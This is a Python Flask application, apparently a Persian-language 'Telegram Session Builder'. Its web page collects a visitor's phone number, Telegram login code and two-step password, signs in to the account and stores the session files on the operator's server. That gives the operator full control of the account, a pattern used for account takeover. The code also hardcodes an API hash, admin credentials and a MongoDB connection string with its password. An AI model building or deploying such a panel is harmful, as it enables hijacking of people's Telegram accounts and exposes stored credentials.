# ================================================================
# Telegram Session Builder – FULL FINAL VERSION (FIXED UI/ADMIN)
# By: Tiam
# ================================================================

import os, asyncio, threading, secrets, time, shutil
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient
import requests

# ===================== CONFIG ===================================

self_config = {
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "tiam",
    "admin_password": "tiam_khorshid",
    "save_path": "sessions",
    "base_url": "https://anime-1127-bot-2.onrender.com",
    "device_name": "⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙"
}

os.makedirs(self_config["save_path"], exist_ok=True)

# ===================== MongoDB ==================================

mongo = MongoClient(
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)

db = mongo.telegram_sessions
sessions_col = db.sessions
links_col = db.links
payments_col = db.payments

# ===================== Flask ====================================

app = Flask(__name__, static_folder="static")

# ===================== Async Loop ================================

loop = asyncio.new_event_loop()
threading.Thread(
    target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()),
    daemon=True
).start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

# ===================== Utils ====================================

def gen_token():
    return secrets.token_urlsafe(8)

def consume_link(token):
    link = links_col.find_one({"token": token})
    if not link:
        return False
    if link["used"] + 1 >= link["max"]:
        links_col.delete_one({"token": token})
    else:
        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
    return True

def normalize_phone(phone):
    phone = phone.strip()
    if phone.startswith("0"):
        return "+98" + phone[1:]
    if phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    return phone

def delete_session(phone):
    path = os.path.join(self_config["save_path"], phone)
    if os.path.exists(path):
        shutil.rmtree(path)
    sessions_col.delete_one({"phone": phone})

def has_paid(phone):
    return payments_col.find_one({"phone": phone, "paid": True}) is not None

# ===================== HTML USER PANEL ===========================

HTML_PAGE = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>Telegram Session Builder</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{
    background:url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;
    background-size:cover;
    font-family:tahoma;
    direction:rtl;
    color:white;
}
.box{
    width:320px;
    margin:80px auto;
    padding:22px;
    background:rgba(15,23,42,0.88);
    border-radius:14px;
    text-align:center;
}
input,button{
    width:100%;
    padding:9px;
    margin-top:10px;
    border-radius:10px;
    border:none;
    font-size:14px;
}
input{direction:ltr}
button{
    background:#6366f1;
    color:white;
    cursor:pointer;
}
#done,#paywall{display:none}
</style>
</head>
<body>

<div class="box">
<h3>ساخت سشن تلگرام</h3>

<input id="mainInput" placeholder="+98xxxxxxxxxx">
<button id="mainBtn" onclick="nextStep()">دریافت کد</button>

<div id="done"><h3>✅ سشن ساخته شد</h3></div>

<div id="paywall">
<h3>💰 بخش پولی</h3>
<button onclick="payNow()">پرداخت و فعال‌سازی</button>
</div>
</div>

<script>
let step = "phone";
let phone = "";

function nextStep(){
    let v = document.getElementById("mainInput").value;

    if(step === "phone"){
        phone = v;
        fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
        .then(r=>r.json()).then(d=>{
            if(d.status==="exists"){
                if(confirm("سشن قبلی حذف شود؟")){
                    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})});
                }
            }else{
                fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
                .then(()=>{
                    step="code";
                    mainInput.placeholder="کد تأیید تلگرام";
                    mainBtn.innerText="تأیید کد";
                });
            }
        });
    }

    else if(step==="code"){
        fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:v})})
        .then(r=>r.json()).then(d=>{
            if(d.status==="2fa"){
                step="password";
                mainInput.type="password";
                mainInput.placeholder="رمز دو مرحله‌ای";
                mainBtn.innerText="تأیید رمز";
            }else if(d.status==="ok"){finish();}
            else alert("کد اشتباه است");
        });
    }

    else if(step==="password"){
        fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:v})})
        .then(()=>finish());
    }
}

function finish(){
    mainInput.style.display="none";
    mainBtn.style.display="none";
    done.style.display="block";
    fetch("/check_payment",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
    .then(r=>r.json()).then(d=>{if(!d.paid)paywall.style.display="block";});
}

function payNow(){
    fetch("/pay",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
    .then(()=>paywall.style.display="none");
}

setInterval(()=>fetch("/ping"),240000);
</script>
</body>
</html>
"""

# ===================== ADMIN PANEL ==============================

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>پنل مدیریت</title>
<style>
body{background:#111;color:white;font-family:tahoma}
table{width:80%;margin:20px auto;border-collapse:collapse}
th,td{border:1px solid #555;padding:8px;text-align:center}
button{padding:6px 10px}
</style>
</head>
<body>

<h2 style="text-align:center">پنل مدیریت</h2>

<form method="post" style="text-align:center">
<input name="max" type="number" value="1" min="1">
<button type="submit">ساخت لینک</button>
</form>

<table>
<tr><th>توکن</th><th>استفاده</th><th>حداکثر</th><th>عملیات</th></tr>
{% for l in links %}
<tr>
<td>{{ l.token }}</td>
<td>{{ l.used }}</td>
<td>{{ l.max }}</td>
<td>
<button onclick="copyLink('{{ l.token }}')">کپی</button>
<button onclick="del('{{ l.token }}')">حذف</button>
</td>
</tr>
{% endfor %}
</table>

<script>
function copyLink(t){
    navigator.clipboard.writeText("{{ self_config.base_url }}/?key="+t)
    alert("لینک کپی شد")
}
function del(t){
    fetch("/admin/delete_link",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:t})})
    .then(()=>location.reload())
}
</script>

</body>
</html>
"""

# ===================== ROUTES ===================================

@app.route("/")
def home():
    key = request.args.get("key")
    if not key or not consume_link(key):
        return "❌ لینک نامعتبر"
    return render_template_string(HTML_PAGE)

@app.route("/ping")
def ping():
    return "OK"

@app.route("/check_phone", methods=["POST"])
def check_phone():
    phone = normalize_phone(request.json["phone"])
    return jsonify(status="exists" if sessions_col.find_one({"phone": phone}) else "ok")

@app.route("/delete_session", methods=["POST"])
def del_sess():
    delete_session(normalize_phone(request.json["phone"]))
    return jsonify(ok=True)

@app.route("/check_payment", methods=["POST"])
def chk_pay():
    return jsonify(paid=has_paid(normalize_phone(request.json["phone"])))

@app.route("/pay", methods=["POST"])
def pay():
    payments_col.update_one({"phone": normalize_phone(request.json["phone"])},{"$set":{"paid":True}},upsert=True)
    return jsonify(ok=True)

clients = {}

async def create_client(phone):
    c = TelegramClient(os.path.join(self_config["save_path"], phone),
                       self_config["api_id"], self_config["api_hash"],
                       device_model=self_config["device_name"])
    await c.connect()
    return c

@app.route("/send_phone", methods=["POST"])
def send_phone():
    phone = normalize_phone(request.json["phone"])
    async def job():
        c = await create_client(phone)
        clients[phone] = c
        await c.send_code_request(phone)
    run_async(job())
    return jsonify(ok=True)

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = normalize_phone(request.json["phone"])
    try:
        run_async(clients[phone].sign_in(phone, request.json["code"]))
        sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
        return jsonify(status="ok")
    except SessionPasswordNeededError:
        return jsonify(status="2fa")
    except PhoneCodeInvalidError:
        return jsonify(status="error")

@app.route("/send_password", methods=["POST"])
def send_pass():
    phone = normalize_phone(request.json["phone"])
    run_async(clients[phone].sign_in(password=request.json["password"]))
    sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
    return jsonify(ok=True)

@app.route("/admin", methods=["GET","POST"])
def admin():
    a = request.authorization
    if not a or a.username!=self_config["admin_username"] or a.password!=self_config["admin_password"]:
        return ("Unauthorized",401,{"WWW-Authenticate":"Basic"})
    if request.method=="POST":
        links_col.insert_one({"token":gen_token(),"max":int(request.form["max"]),"used":0})
        return redirect("/admin")
    return render_template_string(ADMIN_HTML,links=list(links_col.find()),self_config=self_config)

@app.route("/admin/delete_link", methods=["POST"])
def del_link():
    links_col.delete_one({"token":request.json["token"]})
    return jsonify(ok=True)

# ===================== KEEP ALIVE ================================

def keep_alive():
    while True:
        try: requests.get(self_config["base_url"]+"/ping",timeout=10)
        except: pass
        time.sleep(240)

threading.Thread(target=keep_alive,daemon=True).start()

# ===================== RUN ======================================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
